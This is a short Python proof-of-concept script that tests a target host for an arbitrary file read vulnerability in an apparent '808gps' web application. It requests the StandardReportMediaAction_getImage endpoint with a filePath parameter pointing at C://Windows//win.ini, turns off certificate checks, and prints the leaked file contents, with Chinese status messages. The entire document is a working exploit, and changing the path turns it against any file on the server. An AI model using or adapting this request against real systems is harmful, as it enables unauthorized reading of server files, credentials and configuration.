#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import time
import json
import re

urllib3.disable_warnings()

def verify(site):
    burp0_url = site + "/808gps/StandardReportMediaAction_getImage.action?filePath=C://Windows//win.ini&fileOffset=1&fileSize=100"
    burp0_headers = {"Content-Type": "application/x-www-form-urlencoded"}
    r = requests.get(burp0_url, headers=burp0_headers, verify=False)
    if r.status_code == 200 and "bit app support" in r.text:
        return r.text[:100]
    return ""


    
if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，读取 win.ini 的内容为：", info)
    else:
        print("[-]漏洞不存在")
